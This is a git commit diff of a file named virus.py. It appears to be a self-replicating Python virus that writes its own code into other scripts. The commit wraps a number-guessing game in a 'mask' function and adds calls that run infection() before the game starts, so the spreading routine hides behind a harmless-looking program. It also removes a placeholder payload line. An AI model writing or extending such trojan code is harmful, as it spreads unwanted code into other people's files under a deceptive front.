157c9490108f3453aecdfa752608ab6406d2c46d
SherryPham <phamthuthu204@gmail.com>
2025-01-26 14:16:51 +1100

    update mask and infection

--- virus.py
+++ virus.py
@@ -40,37 +40,42 @@ def infection():
             with open(script, 'w') as f:
                 f.writelines(final_code)
 
-    # Malicious piece of code (payload)
-    print('THIS IS THE VIRUS')
+# Malicious piece of code (payload)
+
 
 ### THE VIRUS ENDS HERE ###
 
 
 # The mask goes here
-import random
+def mask():
+    import random
 
-print("Hi welcome to the game, This is a number guessing game.\nYou got 7 chances to guess the number. Let's start the game")
+    print("Hi welcome to the game, This is a number guessing game.\nYou got 7 chances to guess the number. Let's start the game")
 
-number_to_guess = random.randrange(100)
+    number_to_guess = random.randrange(100)
 
-chances = 7
+    chances = 7
 
-guess_counter = 0
+    guess_counter = 0
 
-while guess_counter < chances:
+    while guess_counter < chances:
 
-    guess_counter += 1
-    my_guess = int(input('Please Enter your Guess : '))
+        guess_counter += 1
+        my_guess = int(input('Please Enter your Guess : '))
 
-    if my_guess == number_to_guess:
-        print(f'The number is {number_to_guess} and you found it right !! in the {guess_counter} attempt')
-        break
+        if my_guess == number_to_guess:
+            print(f'The number is {number_to_guess} and you found it right !! in the {guess_counter} attempt')
+            break
 
-    elif guess_counter >= chances and my_guess != number_to_guess:
-        print(f'Oops sorry, The number is {number_to_guess} better luck next time')
+        elif guess_counter >= chances and my_guess != number_to_guess:
+            print(f'Oops sorry, The number is {number_to_guess} better luck next time')
 
-    elif my_guess > number_to_guess:
-        print('Your guess is higher ')
+        elif my_guess > number_to_guess:
+            print('Your guess is higher ')
 
-    elif my_guess < number_to_guess:
-        print('Your guess is lesser')
+        elif my_guess < number_to_guess:
+            print('Your guess is lesser')
+
+
+infection()
+mask()
